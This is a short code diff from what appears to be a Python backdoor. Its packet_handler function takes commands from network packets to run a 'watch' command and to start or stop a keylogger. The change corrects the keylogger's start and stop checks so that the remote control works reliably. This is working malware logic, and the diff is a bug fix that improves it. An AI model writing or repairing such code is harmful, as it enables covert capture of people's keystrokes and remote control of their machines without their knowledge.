@@ -286,12 +286,12 @@ def packet_handler(pkt):
             execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
             if argv[1] == STOP:
-                if KEYLOGGER_INSTANCE.stop() == False:
+                if KEYLOGGER_INSTANCE.stop():
                     print("SUCCESS: Stopped keylogger")
                 else:
                     print("FAILED: You can't stop an inactive keylogger")
             if argv[1] == START:
-                if KEYLOGGER_INSTANCE.stop() == False:
+                if KEYLOGGER_INSTANCE.start():
                     print("SUCCESS: Started keylogger")
                 else:
                     print("FAILED: You can't start an active keylogger")
